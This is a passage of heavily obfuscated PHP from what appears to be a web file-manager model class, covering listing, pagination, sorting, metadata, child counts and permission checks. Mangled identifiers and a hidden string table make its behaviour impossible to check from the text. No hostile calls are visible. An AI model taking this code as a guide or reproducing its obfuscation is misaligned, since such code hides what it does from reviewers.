Model($„ªµ§ [489])->listData(); $Åª½Ö«û = array_filter_by_field($İéÎ®…¨, $„ªµ§ [33], $„ªµ§ [490]); $Åª½Ö«û = array_to_keyvalue($Åª½Ö«û, $„ªµ§ [12], $„ªµ§ [87]); if ($Åª½Ö«û) { $¤±¥¶ØÔ = $this->listSource(array($„ªµ§ [491] => array($„ªµ§ [492], $Åª½Ö«û))); } $¤±¥¶ØÔ = array_to_keyvalue($¤±¥¶ØÔ[$„ªµ§ [445]], $„ªµ§ [193]); foreach ($İéÎ®…¨ as &$«ÌâˆÆ) { $«ÌâˆÆ = array($„ªµ§ [493] => $«ÌâˆÆ[$„ªµ§ [475]], $„ªµ§ [494] => $«ÌâˆÆ[$„ªµ§ [32]], $„ªµ§ [495] => $«ÌâˆÆ[$„ªµ§ [87]], $„ªµ§ [496] => $«ÌâˆÆ[$„ªµ§ [33]], $„ªµ§ [497] => $«ÌâˆÆ[$„ªµ§ [231]], $„ªµ§ [498] => $«ÌâˆÆ[$„ªµ§ [88]]); if ($«ÌâˆÆ[$„ªµ§ [33]] == $„ªµ§ [490] && $¤±¥¶ØÔ[$«ÌâˆÆ[$„ªµ§ [87]]]) { $«ÌâˆÆ[$„ªµ§ [90]] = $¤±¥¶ØÔ[$«ÌâˆÆ[$„ªµ§ [87]]]; } } unset($«ÌâˆÆ); return $İéÎ®…¨; } public function listUserTag($¤Ã²ä¡ˆ) { $¯ôŠó¸Õ =& $_SERVER[ìïæ“œî]; if ($¤Ã²ä¡ˆ && !is_array($¤Ã²ä¡ˆ)) { $¤Ã²ä¡ˆ = array($¤Ã²ä¡ˆ); } $”§Â¤ Ú = Model($¯ôŠó¸Õ[499])->listData(); $·İŠĞûÆ = array(); $çä§ËæŠ = array(); foreach ($”§Â¤ Ú as $±³«¸à˜) { $î­¶°ËÇ = $±³«¸à˜[$¯ôŠó¸Õ[87]]; if (!$î­¶°ËÇ) { continue; } if (!isset($çä§ËæŠ[$î­¶°ËÇ])) { $çä§ËæŠ[$î­¶°ËÇ] = array(); } $çä§ËæŠ[$î­¶°ËÇ][] = $±³«¸à˜[$¯ôŠó¸Õ[500]]; $·İŠĞûÆ[$±³«¸à˜[$¯ôŠó¸Õ[87]]] = $±³«¸à˜; } $ÈŸ½Ïˆ = array(); $•¸àÜŒ = array(); $÷¿€¥æİ = array(); foreach ($çä§ËæŠ as $†»±·› => $ÑÙìÙÇ…) { $¢ëÌ¤¼· = !0; if (!$¤Ã²ä¡ˆ) { $ÈŸ½Ïˆ[] = $†»±·›; continue; } foreach ($¤Ã²ä¡ˆ as $Ü¤Ñéº) { if (!in_array($Ü¤Ñéº, $ÑÙìÙÇ…)) { $¢ëÌ¤¼· = !1; break; } } if (!$¢ëÌ¤¼·) { continue; } if (!is_numeric($†»±·›)) { $áÄùÌ½ = $·İŠĞûÆ[$†»±·›]; $ïş•ëÒ£ = array($¯ôŠó¸Õ[32] => $áÄùÌ½[$¯ôŠó¸Õ[32]], $¯ôŠó¸Õ[87] => $áÄùÌ½[$¯ôŠó¸Õ[87]], $¯ôŠó¸Õ[33] => $áÄùÌ½[$¯ôŠó¸Õ[33]], $¯ôŠó¸Õ[90] => array($¯ôŠó¸Õ[501] => 1), $¯ôŠó¸Õ[232] => !0); if ($áÄùÌ½[$¯ôŠó¸Õ[33]] == $¯ôŠó¸Õ[230]) { $÷¿€¥æİ[] = $ïş•ëÒ£; } if ($áÄùÌ½[$¯ôŠó¸Õ[33]] == $¯ôŠó¸Õ[78]) { $•¸àÜŒ[] = $ïş•ëÒ£; } continue; } $ÈŸ½Ïˆ[] = $†»±·›; } if ($ÈŸ½Ïˆ) { $©×Õƒ‚„ = $this->listSource(array($¯ôŠó¸Õ[491] => array($¯ôŠó¸Õ[492], $ÈŸ½Ïˆ))); } $©×Õƒ‚„ = $©×Õƒ‚„ ? $©×Õƒ‚„ : array($¯ôŠó¸Õ[85] => array(), $¯ôŠó¸Õ[86] => array()); $©×Õƒ‚„[$¯ôŠó¸Õ[85]] = array_merge($©×Õƒ‚„[$¯ôŠó¸Õ[85]], $•¸àÜŒ); $©×Õƒ‚„[$¯ôŠó¸Õ[86]] = array_merge($©×Õƒ‚„[$¯ôŠó¸Õ[86]], $÷¿€¥æİ); if (isset($©×Õƒ‚„[$¯ôŠó¸Õ[442]]) && count($ÈŸ½Ïˆ) == $©×Õƒ‚„[$¯ôŠó¸Õ[442]][$¯ôŠó¸Õ[443]]) { return $©×Õƒ‚„; } $²çÉ©Î· = array(); $ÇÙ«Û² = array_to_keyvalue($©×Õƒ‚„[$¯ôŠó¸Õ[85]], $¯ôŠó¸Õ[12], $¯ôŠó¸Õ[193]); $¢âÁµÀÖ = array_to_keyvalue($©×Õƒ‚„[$¯ôŠó¸Õ[86]], $¯ôŠó¸Õ[12], $¯ôŠó¸Õ[193]); $Ñ¦¬¦ü· = array_merge($¢âÁµÀÖ, $ÇÙ«Û²); foreach ($ÈŸ½Ïˆ as $î­¶°ËÇ) { if (!in_array($î­¶°ËÇ, $Ñ¦¬¦ü·)) { $²çÉ©Î·[] = $î­¶°ËÇ; } } if ($²çÉ©Î·) { Model($¯ôŠó¸Õ[502])->removeBySource($²çÉ©Î·); } return $©×Õƒ‚„; } public function listUserRecycle() { $êï ìŠ¥ =& $_SERVER[ìïæ“œî]; $¾œûÌœò = Model($êï ìŠ¥[503])->listData(); if (!$¾œûÌœò) { return array(); } $»í©ùÕ‡ = array($êï ìŠ¥[491] => array($êï ìŠ¥[492], $¾œûÌœò), $êï ìŠ¥[504] => 1); return $this->listSource($»í©ùÕ‡); } public function listSource($û…—Ä–ş, $¦Õ É­ì = 3000, $Î¦œ­® = false) { $…€ûş†Ó =& $_SERVER[ìïæ“œî]; if (!isset($û…—Ä–ş[$…€ûş†Ó[505]])) { $û…—Ä–ş[$…€ûş†Ó[505]] = 0; } if (isset($û…—Ä–ş[$…€ûş†Ó[192]]) && $û…—Ä–ş[$…€ûş†Ó[192]] == $…€ûş†Ó[228]) { $û…—Ä–ş[$…€ûş†Ó[486]] = array($…€ûş†Ó[407], $…€ûş†Ó[506]); } $“Ã†ÚãÕ = $…€ûş†Ó[507]; $ëµŒà¨õ = $this->field($“Ã†ÚãÕ)->_makeOrder()->where($û…—Ä–ş)->selectPage($¦Õ É­ì); $this->_listPageCheck($ëµŒà¨õ, $“Ã†ÚãÕ, $û…—Ä–ş); $this->_listDataApply($ëµŒà¨õ[$…€ûş†Ó[445]], $Î¦œ­®); $this->_listMake($ëµŒà¨õ); return $ëµŒà¨õ; } private function _listPageCheck(&$™ËÎ¹‡, $ºû¤˜†, $¥½–°“¸) { $œÇß¥†ç =& $_SERVER[ìïæ“œî]; if (!is_array($™ËÎ¹‡[$œÇß¥†ç[442]])) { return; } $ş¤‚³€ù = $™ËÎ¹‡[$œÇß¥†ç[442]]; if ($ş¤‚³€ù[$œÇß¥†ç[444]] <= 1) { return; } if ($ş¤‚³€ù[$œÇß¥†ç[443]] >= 100000) { return; } if (Model($œÇß¥†ç[508])->get($œÇß¥†ç[509]) != $œÇß¥†ç[510]) { return; } $ºû¤˜† = str_replace(array($œÇß¥†ç[53], $œÇß¥†ç[418], $œÇß¥†ç[262]), $œÇß¥†ç[12], $ºû¤˜†); $ºû¤˜† = $œÇß¥†ç[511] . str_replace($œÇß¥†ç[50], $œÇß¥†ç[512], $ºû¤˜†) . $œÇß¥†ç[513]; $ıÄõñ˜ = $œÇß¥†ç[514]; $ıÄõñ˜ = $ıÄõñ˜ . $œÇß¥†ç[515]; $Œ©ŒŒü² = $ş¤‚³€ù[$œÇß¥†ç[439]] * ($ş¤‚³€ù[$œÇß¥†ç[429]] - 1) . $œÇß¥†ç[50] . $ş¤‚³€ù[$œÇß¥†ç[439]]; $ú¤ô‡Ü = $this->_makeOrder(!0); $–ƒóòÚ¼ = $œÇß¥†ç[511] . str_replace($œÇß¥†ç[50], $œÇß¥†ç[512], $ú¤ô‡Ü[0]); if (strpos($–ƒóòÚ¼, $œÇß¥†ç[516])) { $–ƒóòÚ¼ = str_replace($œÇß¥†ç[516], $œÇß¥†ç[517], $–ƒóòÚ¼); } else { $–ƒóòÚ¼ .= $œÇß¥†ç[518] . $ú¤ô‡Ü[1]; } $ƒªĞÊ = array(); foreach ($¥½–°“¸ as $æ›ÅÂÃ => $­ûÁ¨‚÷) { $ƒªĞÊ[$œÇß¥†ç[511] . $æ›ÅÂÃ] = $­ûÁ¨‚÷; } $this->alias($œÇß¥†ç[519])->field($ºû¤˜†)->limit($Œ©ŒŒü²)->order($–ƒóòÚ¼); $òë¹ĞÇ = $this->join($ıÄõñ˜)->where($ƒªĞÊ)->select(); if ($òë¹ĞÇ) { $™ËÎ¹‡[$œÇß¥†ç[445]] = $òë¹ĞÇ; } } protected function _makeOrder($›íÅšì = false) { $è¦Ã÷¢ä =& $_SERVER[ìïæ“œî]; $ÜŠ›ˆü› = Model($è¦Ã÷¢ä[520])->get($è¦Ã÷¢ä[521]); $¥„õ¤ = Model($è¦Ã÷¢ä[520])->get($è¦Ã÷¢ä[522]); $û‰³§ºæ = array($è¦Ã÷¢ä[523] => $è¦Ã÷¢ä[524], $è¦Ã÷¢ä[525] => $è¦Ã÷¢ä[526]); $¤Ş¯°Ò = array($è¦Ã÷¢ä[32] => $è¦Ã÷¢ä[32], $è¦Ã÷¢ä[79] => $è¦Ã÷¢ä[79], $è¦Ã÷¢ä[169] => $è¦Ã÷¢ä[486], $è¦Ã÷¢ä[527] => $è¦Ã÷¢ä[527], $è¦Ã÷¢ä[528] => $è¦Ã÷¢ä[529], $è¦Ã÷¢ä[231] => $è¦Ã÷¢ä[231], $è¦Ã÷¢ä[88] => $è¦Ã÷¢ä[88]); $¸êñ—ø³ = Input::get($è¦Ã÷¢ä[530], $è¦Ã÷¢ä[7], $ÜŠ›ˆü›, array_keys($¤Ş¯°Ò)); $êôÍÒö = Input::get($è¦Ã÷¢ä[531], $è¦Ã÷¢ä[7], $¥„õ¤, array_keys($û‰³§ºæ)); if (!in_array($¸êñ—ø³, array_keys($¤Ş¯°Ò))) { $¸êñ—ø³ = $è¦Ã÷¢ä[32]; } if (!in_array($êôÍÒö, array_keys($û‰³§ºæ))) { $¸êñ—ø³ = $è¦Ã÷¢ä[523]; } if ($¸êñ—ø³ == $è¦Ã÷¢ä[32]) { } $áÌºÜå = $è¦Ã÷¢ä[532] . $¤Ş¯°Ò[$¸êñ—ø³] . $è¦Ã÷¢ä[53] . $û‰³§ºæ[$êôÍÒö]; $áÌºÜå = rtrim(trim($áÌºÜå), $è¦Ã÷¢ä[50]); if ($›íÅšì) { return array($áÌºÜå, $û‰³§ºæ[$êôÍÒö]); } return $this->order($áÌºÜå); } protected function _listDataApplyItem($›²Øõ§, $æÉ›¡³  = false) { $““¹”¼ = array($›²Øõ§); $this->_listDataApply($““¹”¼, $æÉ›¡³ ); return $““¹”¼[0]; } protected function _listDataApply(&$»ØÔã®¼, $´ĞÄ•¢“ = false) { $è«µ…ı =& $_SERVER[ìïæ“œî]; if (!$»ØÔã®¼) { $»ØÔã®¼ = array(); return; } $ºùáú = array_to_keyvalue($»ØÔã®¼, $è«µ…ı[12], $è«µ…ı[193]); $ºùáú = array_unique($ºùáú); $this->_listSourceCache($»ØÔã®¼); if (!$´ĞÄ•¢“) { $this->_listAppendMeta($»ØÔã®¼, $ºùáú); $this->_listAppendFileMeta($»ØÔã®¼, $ºùáú); $this->_listAppendChildren($»ØÔã®¼, $ºùáú); } $this->_listAppendPath($»ØÔã®¼); $this->_listAppendAuth($»ØÔã®¼); $this->_listAppendSourceInfo($»ØÔã®¼, $ºùáú); $this->_listAppendUser($»ØÔã®¼); $this->_listFilterInfo($»ØÔã®¼, $´ĞÄ•¢“); $this->_listAppendAuthSecret($»ØÔã®¼); } protected function _listSourceCache($ïÎ’ğìÎ) { $¿”¼” =& $_SERVER[ìïæ“œî]; foreach ($ïÎ’ğìÎ as $â“ãòğê) { self::$cacheSourceInfo[$¿”¼”[533] . $â“ãòğê[$¿”¼”[193]]] = $â“ãòğê; } } protected function _listFilterInfo(&$»œ­óı», $ˆñæÉİ™ = false) { $“Ğ…Ş… =& $_SERVER[ìïæ“œî]; foreach ($»œ­óı» as &$·ï  ‘») { $·ï  ‘» = $this->pathInfoFilter($·ï  ‘»); self::$cachePathInfo[$“Ğ…Ş…[534] . intval($ˆñæÉİ™) . $“Ğ…Ş…[462] . $·ï  ‘»[$“Ğ…Ş…[193]]] = $·ï  ‘»; } unset($·ï  ‘»); } protected function _listMake(&$­¨Œİá…) { $ù¸õ¸Á =& $_SERVER[ìïæ“œî]; $­¨Œİá…[$ù¸õ¸Á[85]] = array(); $­¨Œİá…[$ù¸õ¸Á[86]] = array(); foreach ($­¨Œİá…[$ù¸õ¸Á[445]] as $Áí°´õ) { $ë™ ó”œ = $Áí°´õ[$ù¸õ¸Á[485]] == 1 ? $ù¸õ¸Á[85] : $ù¸õ¸Á[86]; $­¨Œİá…[$ë™ ó”œ][] = $Áí°´õ; } unset($­¨Œİá…[$ù¸õ¸Á[445]]); } protected function _listAppendMeta(&$õç‡Ø•©, $‹†ì°ñ¬) { $Œ˜“›¼ =& $_SERVER[ìïæ“œî]; $ŒÃµæ°ä = array($Œ˜“›¼[491] => array($Œ˜“›¼[492], $‹†ì°ñ¬)); $ß‚§ÍâÎ = Model($Œ˜“›¼[535])->field($Œ˜“›¼[536])->where($ŒÃµæ°ä)->select(); if (!$ß‚§ÍâÎ) { return; } $Ü¿æšõ = array($Œ˜“›¼[537], $Œ˜“›¼[538], $Œ˜“›¼[517]); $Æİ‘Õº‹ = array(); foreach ($ß‚§ÍâÎ as $¸€éÄ) { if (!isset($Æİ‘Õº‹[$¸€éÄ[$Œ˜“›¼[193]]])) { $Æİ‘Õº‹[$¸€éÄ[$Œ˜“›¼[193]]] = array(); } if (in_array($¸€éÄ[$Œ˜“›¼[97]], $Ü¿æšõ)) { continue; } $Æİ‘Õº‹[$¸€éÄ[$Œ˜“›¼[193]]][$¸€éÄ[$Œ˜“›¼[97]]] = $¸€éÄ[$Œ˜“›¼[450]]; } foreach ($õç‡Ø•© as &$çÙáåœÏ) { $çÙáåœÏ[$Œ˜“›¼[539]] = !1; if (isset($Æİ‘Õº‹[$çÙáåœÏ[$Œ˜“›¼[193]]])) { $çÙáåœÏ[$Œ˜“›¼[539]] = $Æİ‘Õº‹[$çÙáåœÏ[$Œ˜“›¼[193]]]; } if ($this->fileIsLock($çÙáåœÏ) && $çÙáåœÏ[$Œ˜“›¼[487]]) { $§«Ì¢¬ö = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $çÙáåœÏ[$Œ˜“›¼[487]][$Œ˜“›¼[488]] = AuthModel::authDisable($çÙáåœÏ[$Œ˜“›¼[487]][$Œ˜“›¼[488]], $§«Ì¢¬ö); $çÙáåœÏ[$Œ˜“›¼[487]][$Œ˜“›¼[540]][$Œ˜“›¼[487]] = $çÙáåœÏ[$Œ˜“›¼[487]][$Œ˜“›¼[488]]; } } unset($çÙáåœÏ); } protected function _listAppendFileMeta(&$©Úë¢Ÿ, $™¶û¾) { $ıâ¡Ğî® =& $_SERVER[ìïæ“œî]; $¾µê°ñ© = array_to_keyvalue($©Úë¢Ÿ, $ıâ¡Ğî®[12], $ıâ¡Ğî®[541]); $¾µê°ñ© = array_filter(array_unique($¾µê°ñ©)); if (!$¾µê°ñ©) { return; } $ÏÖÓŞÜ = array($ıâ¡Ğî®[542] => array($ıâ¡Ğî®[492], $¾µê°ñ©)); $œÈ‡¿´ = $ıâ¡Ğî®[543]; $˜ˆâ¼©÷ = Model($ıâ¡Ğî®[544])->field($œÈ‡¿´)->where($ÏÖÓŞÜ)->select(); $˜ˆâ¼©÷ = array_to_keyvalue($˜ˆâ¼©÷, $ıâ¡Ğî®[541]); $º¬èÌ®Ş = Model($ıâ¡Ğî®[545])->field($ıâ¡Ğî®[546])->where($ÏÖÓŞÜ)->select(); $º¬èÌ®Ş = $º¬èÌ®Ş ? $º¬èÌ®Ş : array(); $—îÑĞ¤š = array(); foreach ($º¬èÌ®Ş as $öİš±»¥) { if (!isset($—îÑĞ¤š[$öİš±»¥[$ıâ¡Ğî®[541]]])) { $—îÑĞ¤š[$öİš±»¥[$ıâ¡Ğî®[541]]] = array(); } $—îÑĞ¤š[$öİš±»¥[$ıâ¡Ğî®[541]]][$öİš±»¥[$ıâ¡Ğî®[97]]] = $öİš±»¥[$ıâ¡Ğî®[450]]; } foreach ($©Úë¢Ÿ as &$§‘ÍÎÍ½) { $é­¢À¿Ò = $§‘ÍÎÍ½[$ıâ¡Ğî®[541]]; if (!$é­¢À¿Ò || !is_array($˜ˆâ¼©÷[$é­¢À¿Ò])) { continue; } $…ä ‰¤Ÿ = $˜ˆâ¼©÷[$é­¢À¿Ò]; $…ä ‰¤Ÿ[$ıâ¡Ğî®[79]] = $§‘ÍÎÍ½[$ıâ¡Ğî®[79]]; $…ä ‰¤Ÿ[$ıâ¡Ğî®[32]] = $§‘ÍÎÍ½[$ıâ¡Ğî®[32]]; if (!$…ä ‰¤Ÿ[$ıâ¡Ğî®[547]]) { Model($ıâ¡Ğî®[544])->fileMd5Check($…ä ‰¤Ÿ); } if (!isset(self::$cacheFileInfo[$ıâ¡Ğî®[548] . $é­¢À¿Ò])) { self::$cacheFileInfo[$ıâ¡Ğî®[548] . $é­¢À¿Ò] = array_merge(array(), $…ä ‰¤Ÿ); } unset($˜ˆâ¼©÷[$é­¢À¿Ò][$ıâ¡Ğî®[87]]); $Ğãó¾æÄ = isset($—îÑĞ¤š[$é­¢À¿Ò]) && is_array($—îÑĞ¤š[$é­¢À¿Ò]) ? $—îÑĞ¤š[$é­¢À¿Ò] : array(); $§‘ÍÎÍ½[$ıâ¡Ğî®[170]] = array_merge($Ğãó¾æÄ, $˜ˆâ¼©÷[$é­¢À¿Ò]); if (isset($§‘ÍÎÍ½[$ıâ¡Ğî®[170]][$ıâ¡Ğî®[184]])) { $§‘ÍÎÍ½[$ıâ¡Ğî®[184]] = json_decode($§‘ÍÎÍ½[$ıâ¡Ğî®[170]][$ıâ¡Ğî®[184]], !0); unset($§‘ÍÎÍ½[$ıâ¡Ğî®[170]][$ıâ¡Ğî®[184]]); } } unset($§‘ÍÎÍ½); } protected function _listAppendSourceInfo(&$«ñÅŸ», $ñÕóˆö) { $Ã×çÆÏ´ =& $_SERVER[ìïæ“œî]; $¦ä—‰³­ = Model($Ã×çÆÏ´[549])->listData(); $ÓÜ´óãÁ = Model($Ã×çÆÏ´[499])->listData(); $ˆõ‰µßŞ = Model($Ã×çÆÏ´[489])->listData(); $í‚µÆ’è = Model($Ã×çÆÏ´[550])->listSimple(); $ÆÓ®±ÆŞ = array_to_keyvalue($¦ä—‰³­, $Ã×çÆÏ´[475]); $‹øîä¡û = array_to_keyvalue_group($ÓÜ´óãÁ, $Ã×çÆÏ´[87], $Ã×çÆÏ´[500]); $ïöËµãä = array_to_keyvalue($ˆõ‰µßŞ, $Ã×çÆÏ´[87]); $æ°´Ë²Í = array_to_keyvalue_group($í‚µÆ’è, $Ã×çÆÏ´[193]); foreach ($«ñÅŸ» as &$èÈ¹‹‰½) { $èÈ¹‹‰½[$Ã×çÆÏ´[90]] = array($Ã×çÆÏ´[551] => 0, $Ã×çÆÏ´[552] => 0, $Ã×çÆÏ´[553] => 0); if (isset($ïöËµãä[$èÈ¹‹‰½[$Ã×çÆÏ´[193]]])) { $èÈ¹‹‰½[$Ã×çÆÏ´[90]][$Ã×çÆÏ´[554]] = 1; $èÈ¹‹‰½[$Ã×çÆÏ´[90]][$Ã×çÆÏ´[555]] = $ïöËµãä[$èÈ¹‹‰½[$Ã×çÆÏ´[193]]][$Ã×çÆÏ´[32]]; } if ($‹øîä¡û && $ÆÓ®±ÆŞ && isset($‹øîä¡û[$èÈ¹‹‰½[$Ã×çÆÏ´[193]]])) { $èÈ¹‹‰½[$Ã×çÆÏ´[90]][$Ã×çÆÏ´[556]] = array(); foreach ($‹øîä¡û[$èÈ¹‹‰½[$Ã×çÆÏ´[193]]] as $–Åóª—Ò) { $ßÇŒÕ”é = $ÆÓ®±ÆŞ[$–Åóª—Ò]; $èÈ¹‹‰½[$Ã×çÆÏ´[90]][$Ã×çÆÏ´[556]][] = array($Ã×çÆÏ´[557] => $ßÇŒÕ”é[$Ã×çÆÏ´[475]], $Ã×çÆÏ´[494] => $ßÇŒÕ”é[$Ã×çÆÏ´[32]], $Ã×çÆÏ´[558] => $ßÇŒÕ”é[$Ã×çÆÏ´[559]]); } } if ($æ°´Ë²Í && isset($æ°´Ë²Í[$èÈ¹‹‰½[$Ã×çÆÏ´[193]]])) { $èÈ¹‹‰½[$Ã×çÆÏ´[90]][$Ã×çÆÏ´[560]] = array(); foreach ($æ°´Ë²Í[$èÈ¹‹‰½[$Ã×çÆÏ´[193]]] as $æ½¡±Ûâ) { $­Œ¼õ… = $Ã×çÆÏ´[561]; if ($æ½¡±Ûâ[$Ã×çÆÏ´[562]] == $Ã×çÆÏ´[91]) { $­Œ¼õ… .= $Ã×çÆÏ´[563]; } $èÈ¹‹‰½[$Ã×çÆÏ´[90]][$Ã×çÆÏ´[560]] = array_field_key($æ½¡±Ûâ, explode($Ã×çÆÏ´[50], $­Œ¼õ…)); } } } unset($èÈ¹‹‰½); return $«ñÅŸ»; } protected function _listAppendChildren(&$•§šúÃË, $şĞ¼æ©ø) { $¢—İˆƒ =& $_SERVER[ìïæ“œî]; $³æäÌ¥ = array(); $ÇÏõ„Í¸ = array($¢—İˆƒ[239] => 0, $¢—İˆƒ[240] => 0); foreach ($•§šúÃË as &$†÷ãùâ) { if (!$†÷ãùâ[$¢—İˆƒ[485]]) { continue; } $³æäÌ¥[] = $†÷ãùâ[$¢—İˆƒ[193]]; } unset($†÷ãùâ); if (!$³æäÌ¥) { return; } $¯Ù¼å¿¦ = array($¢—İˆƒ[192] => array($¢—İˆƒ[7], $³æäÌ¥), $¢—İˆƒ[505] => 0); $½ó†«šæ = array($¢—İˆƒ[192], $¢—İˆƒ[485], $¢—İˆƒ[564] => $¢—İˆƒ[565]); $ÆÜøşñœ = $this->field($½ó†«šæ)->where($¯Ù¼å¿¦)->group($¢—İˆƒ[566])->select(); $…ˆñ¡” = array(); foreach ($ÆÜøşñœ as $»ãÍñ·¸) { $»­ş©¾ö = $»ãÍñ·¸[$¢—İˆƒ[192]]; $¶ã®¿Şô = $»ãÍñ·¸[$¢—İˆƒ[485]] == $¢—İˆƒ[91] ? $¢—İˆƒ[240] : $¢—İˆƒ[239]; if (!isset($…ˆñ¡”[$»­ş©¾ö])) { $…ˆñ¡”[$»­ş©¾ö] = array($¢—İˆƒ[239] => 0, $¢—İˆƒ[240] => 0); } $…ˆñ¡”[$»­ş©¾ö][$¶ã®¿Şô] += $»ãÍñ·¸[$¢—İˆƒ[565]]; } foreach ($•§šúÃË as &$†÷ãùâ) { if (!$†÷ãùâ[$¢—İˆƒ[485]]) { continue; } $ïúÊó÷ = is_array($…ˆñ¡”[$†÷ãùâ[$¢—İˆƒ[193]]]) ? $…ˆñ¡”[$†÷ãùâ[$¢—İˆƒ[193]]] : $ÇÏõ„Í¸; $†÷ãùâ[$¢—İˆƒ[240]] = $ïúÊó÷[$¢—İˆƒ[240]]; $†÷ãùâ[$¢—İˆƒ[239]] = $ïúÊó÷[$¢—İˆƒ[239]]; unset($†÷ãùâ[$¢—İˆƒ[486]]); } unset($†÷ãùâ); } protected function _listAppendAuth(&$‘Ô•Ôôæ) { $€Ü©—Û =& $_SERVER[ìïæ“œî]; $¶Æšæºà = array(); foreach ($‘Ô•Ôôæ as $„à·Ø›) { if ($„à·Ø›[$€Ü©—Û[190]] == self::TYPE_GROUP) { $¶Æšæºà[] = $„à·Ø›[$€Ü©—Û[193]]; } } if (!$¶Æšæºà) { return; } $¦áÕ¿æ = array_to_keyvalue($‘Ô•Ôôæ, $€Ü©—Û[193]); $ªÃ±ŒÔÉ = Model($€Ü©—Û[567])->getSourceList($¶Æšæºà, $¦áÕ¿æ); $ª±äĞåº = KodUser::isRoot(); foreach ($‘Ô•Ôôæ as $«…õæ‘¶ => &$„à·Ø›) { $„à·Ø›[$€Ü©—Û[487]] = $ªÃ±ŒÔÉ[$„à·Ø›[$€Ü©—Û[193]]]; if (!$„à·Ø›[$€Ü©—Û[487]] && $„à·Ø›[$€Ü©—Û[190]] == self::TYPE_GROUP) { $„à·Ø›[$€Ü©—Û[487]] = Action($€Ü©—Û[568])->pathGroupAuthMake($„à·Ø›[$€Ü©—Û[569]]); if (!$„à·Ø›[$€Ü©—Û[487]] && !$ª±äĞåº) { $„à·Ø›[$€Ü©—Û[233]] = !1; $„à·Ø›[$€Ü©—Û[232]] = !1; } } if ($„à·Ø›[$€Ü©—Û[487]]) { $„à·Ø›[$€Ü©—Û[233]] = AuthModel::authCheckEdit($„à·Ø›[$€Ü©—Û[487]][$€Ü©—Û[488]]); $„à·Ø›[$€Ü©—Û[232]] = AuthModel::authCheckView($„à·Ø›[$€Ü©—Û[487]][$€Ü©—Û[488]]); } $this->groupPathDisplay($„à·Ø›); } unset($„à·Ø›); } public function _listAppendAuthSecret(&$ŸÅÃø«ö) { $Úš»äÊ½ =& $_SERVER[ìïæ“œî]; if (Model($Úš»äÊ½[508])->get($Úš»äÊ½[570]) != $Úš»äÊ½[91]) { return; } static $ùËÛË‰Ï = false; if (!$ùËÛË‰Ï) { $Ğ¹Š™ÀÔ = Model($Úš»äÊ½[571]); $Áüšöñ­ = Model($Úš»äÊ½[572]); $ùËÛË‰Ï = $Áüšöñ­->listData(); $ùËÛË‰Ï = array_to_keyvalue($ùËÛË‰Ï, $Úš»äÊ½[193]); $§ÕÛó®¡ = json_decode(Model($Úš»äÊ½[508])->get($Úš»äÊ½[573]), !0); $§ÕÛó®¡ = array_to_keyvalue($§ÕÛó®¡, $Úš»äÊ½[475]); foreach ($ùËÛË‰Ï as $¶ˆò©ƒê => $½‹´ğãü) { $Ã¤µ£ÇĞ = $§ÕÛó®¡[$½‹´ğãü[$Úš»äÊ½[574]]]; if (!$Ã¤µ£ÇĞ) { $Áüšöñ­->remove($½‹´ğãü[$Úš»äÊ½[475]]); unset($ùËÛË‰Ï[$¶ˆò©ƒê]); continue; } $¿·›­ö = $Ğ¹Š™ÀÔ->listData($Ã¤µ£ÇĞ[$Úš»äÊ½[487]]); if (!$¿·›­ö) { $Áüšöñ­->remove($½‹´ğãü[$Úš»äÊ½[475]]); unset($ùËÛË‰Ï[$¶ˆò©ƒê]); continue; } $½‹´ğãü[$Úš»äÊ½[487]] = $¿·›­ö; $½‹´ğãü[$Úš»äÊ½[575]] = $Ã¤µ£ÇĞ; $½‹´ğãü[$Úš»äÊ½[576]] = Model($Úš»äÊ½[577])->getInfoSimpleOuter($½‹´ğãü[$Úš»äÊ½[527]]); $ùËÛË‰Ï[$¶ˆò©ƒê] = $½‹´ğãü; } } $’ãÏ¤²ä = USER_ID; $âèëœ× = array(); $ô¢Âçç¼ = $this->_listAppendPath($âèëœ×, !0); foreach ($ŸÅÃø«ö as $¶ˆò©ƒê => &$½‹´ğãü) { if (!is_array($½‹´ğãü[$Úš»äÊ½[487]])) { continue; } if ($½‹´ğãü[$Úš»äÊ½[190]] != $Úš»äÊ½[578]) { continue; } if (isset($ùËÛË‰Ï[$½‹´ğãü[$Úš»äÊ½[193]]])) { $íÁ°—¦Š = $ùËÛË‰Ï[$½‹´ğãü[$Úš»äÊ½[193]]]; if (!is_array($½‹´ğãü[$Úš»äÊ½[539]])) { $½‹´ğãü[$Úš»äÊ½[539]] = array(); } $½‹´ğãü[$Úš»äÊ½[539]][$Úš»äÊ½[579]] = $íÁ°—¦Š[$Úš»äÊ½[574]]; $½‹´ğãü[$Úš»äÊ½[487]][$Úš»äÊ½[580]] = $íÁ°—¦Š; $½‹´ğãü[$Úš»äÊ½[487]][$Úš»äÊ½[581]] = $½‹´ğãü[$Úš»äÊ½[582]]; $½‹´ğãü[$Úš»äÊ½[487]][$Úš»äÊ½[583]] = $Úš»äÊ½[91]; if ($íÁ°—¦Š[$Úš»äÊ½[527]] != $’ãÏ¤²ä) { $½‹´ğãü[$Úš»äÊ½[487]][$Úš»äÊ½[488]] = $½‹´ğãü[$Úš»äÊ½[487]][$Úš»äÊ½[488]] & $íÁ°—¦Š[$Úš»äÊ½[487]][$Úš»äÊ½[487]]; } continue; } $Å„®€‚´ = $this->parentLevelArray($½‹´ğãü[$Úš»äÊ½[584]]); $â¸ğéÔş = array_reverse($Å„®€‚´); foreach ($â¸ğéÔş as $óâ»éèù => $ûš»©›¨) { if (!isset($ùËÛË‰Ï[$ûš»©›¨])) { continue; } $íÁ°—¦Š = $ùËÛË‰Ï[$ûš»©›¨]; $½‹´ğãü[$Úš»äÊ½[487]][$Úš»äÊ½[580]] = $íÁ°—¦Š; if ($íÁ°—¦Š[$Úš»äÊ½[527]] != $’ãÏ¤²ä) { $½‹´ğãü[$Úš»äÊ½[487]][$Úš»äÊ½[488]] = $½‹´ğãü[$Úš»äÊ½[487]][$Úš»äÊ½[488]] & $íÁ°—¦Š[$Úš»äÊ½[487]][$Úš»äÊ½[487]]; } $Ô÷Âæ—Ê = $Úš»äÊ½[12]; $‡ÆõÚƒ• = count($Å„®€‚´) - $óâ»éèù; for ($ªğä½İ = 0; $ªğä½İ < $‡ÆõÚƒ•; $ªğä½İ++) { if (!isset($ô¢Âçç¼[$Å„®€‚´[$ªğä½İ]])) { $Ô÷Âæ—Ê = $Úš»äÊ½[12]; break; } $Ô÷Âæ—Ê = $Ô÷Âæ—Ê . rtrim($ô¢Âçç¼[$Å„®€‚´[$ªğä½İ]], $Úš»äÊ½[8]) . $Úš»äÊ½[8]; } 